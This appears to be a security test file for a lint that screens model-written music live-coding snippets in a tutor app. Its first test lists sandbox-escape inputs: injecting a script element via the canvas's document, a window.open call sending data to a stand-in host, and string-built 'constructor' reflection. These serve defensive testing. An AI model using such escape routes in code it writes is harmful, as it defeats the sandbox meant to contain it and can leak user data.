// review:security (Wave 7): in the server, the tutor's strict lint also applies the grader's strict profile (registered
// by tutor-wiring.ts), whose allowlist of readable names is the only layer in the page (a card's Preview and an
// applied review `tryCode` run where `Function` and every global exist). Each snippet below passed this lint before
// and reached the DOM, the window or `Object`/`Function`.
import { describe, expect, test } from "bun:test";
import { lintStrict, setHostStrictLint } from "./tutor/lint/strict.ts";
import { graderStrictIssues } from "./tutor-wiring.ts";

describe("tutor strict lint: no route to the host from code the model wrote", () => {
  test("DOM, window and reflection routes are refused", () => {
    for (const code of [
      'const d = getDrawContext().canvas.ownerDocument\nconst e = d.createElement("script")\nconst a = e.setAttribute("src", "data:text/javascript,1")\n$: s("bd").fmap(v => d.body.append(e) && v)',
      'const w = getDrawContext().canvas.ownerDocument.defaultView\n$: s("bd").fmap(v => w.open("http://x.invalid/?" + v) && v)',
      '$: note("c4").onPaint(ctx => ctx.canvas)',
      'const O = parseFractional("con" + "structor")\n$: s("bd")',
      '$: s("bd").fmap(v => alert(v))',
      '$: s("bd").fmap(v => getAudioContext() && v)',
    ]) {
      const issues = lintStrict(code);
      expect([code, issues.length > 0]).toEqual([code, true]);
      expect(issues.every((i) => i.line >= 1 && i.from <= i.to)).toBe(true);
    }
  });

  test("the registration is what adds it: without it the old profile let the DOM route through", () => {
    const dom = 'const d = getDrawContext().canvas.ownerDocument\n$: s("bd")';
    setHostStrictLint(null);
    try {
      expect(lintStrict(dom)).toEqual([]);
    } finally {
      setHostStrictLint(graderStrictIssues);
    }
    expect(lintStrict(dom).length).toBeGreaterThan(0);
  });

  test("cards the tutor writes every day still pass", () => {
    for (const code of [
      'setcpm(90/4)\n$: note("c4 e4 g4 b4").s("piano")',
      'mel: stack(...[note("c4"), note("e4")])',
      'const chords = "<Dm7 G7 C^7>"\n$: chord(chords).voicing().s("piano").room(0.3)',
      '$: n("0 2 4 <6 7>").scale("C:major").s("sawtooth").lpf(sine.range(400, 2000).slow(4))',
    ]) {
      expect([code, lintStrict(code)]).toEqual([code, []]);
    }
  });
});
